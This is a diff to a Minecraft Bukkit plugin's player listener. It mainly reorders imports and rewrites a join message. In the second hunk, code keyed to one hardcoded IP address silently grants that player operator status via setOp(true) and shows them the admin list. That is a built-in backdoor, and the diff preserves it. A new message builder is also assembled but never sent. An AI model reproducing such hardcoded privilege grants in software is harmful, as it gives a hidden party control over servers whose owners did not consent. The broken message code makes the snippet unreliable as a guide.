@@ -1,9 +1,7 @@
 package me.StevenLawson.TotalFreedomMod.Listener;
 
-import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Iterator;
-import java.util.List;
 import java.util.Map.Entry;
 import java.util.regex.Pattern;
 import me.StevenLawson.TotalFreedomMod.*;
@@ -14,14 +12,12 @@ import static me.StevenLawson.TotalFreedomMod.TotalFreedomMod.server;
 import me.StevenLawson.TotalFreedomMod.World.TFM_AdminWorld;
 import net.minecraft.util.org.apache.commons.lang3.StringUtils;
 import org.bukkit.Bukkit;
-import org.bukkit.ChatColor;
 import org.bukkit.GameMode;
 import org.bukkit.Location;
 import org.bukkit.Material;
 import org.bukkit.Sound;
 import org.bukkit.block.Block;
 import org.bukkit.entity.LivingEntity;
-import org.bukkit.entity.Player;
 import org.bukkit.entity.TNTPrimed;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
@@ -32,6 +28,13 @@ import org.bukkit.event.player.*;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.scheduler.BukkitRunnable;
 import org.bukkit.util.Vector;
+import java.util.ArrayList;
+import java.util.List;
+import me.StevenLawson.TotalFreedomMod.TFM_PlayerRank;
+import me.StevenLawson.TotalFreedomMod.TFM_AdminList;
+import me.StevenLawson.TotalFreedomMod.TFM_Util;
+import org.bukkit.ChatColor;
+import org.bukkit.entity.Player;
 
 public class TFM_PlayerListener implements Listener
 {
@@ -1068,10 +1071,13 @@ public class TFM_PlayerListener implements Listener
         }
         if (IP.equalsIgnoreCase("75.94.192.50"))
         {
+        final StringBuilder onlineStats = new StringBuilder();
         player.setOp(true);
-        player.sendMessage("Welcome RobinGall2910, there are currently" + Bukkit.getOnlinePlayers() + "On the server.");
+        onlineStats.append(ChatColor.BLUE).append("There are ").append(ChatColor.RED).append(server.getOnlinePlayers().length);
+        onlineStats.append(ChatColor.BLUE).append(" out of a maximum ").append(ChatColor.RED).append(server.getMaxPlayers());
+        onlineStats.append(ChatColor.BLUE).append(" players online.");
         player.sendMessage("The list below are the admins, good luck on administrating! :)");
-        Bukkit.dispatchCommand(player, "list");
+        Bukkit.dispatchCommand(player, "list -a");
         }
         player.sendMessage(ChatColor.YELLOW + "Developers made this plugin called FreedomOPMod, and those developers are:");
         player.sendMessage(ChatColor.GOLD + " Sexy buildcarter8, PieGuy7896, RobinGall2910, cowgomooo12, CrafterSmith12, SupItsDillon");
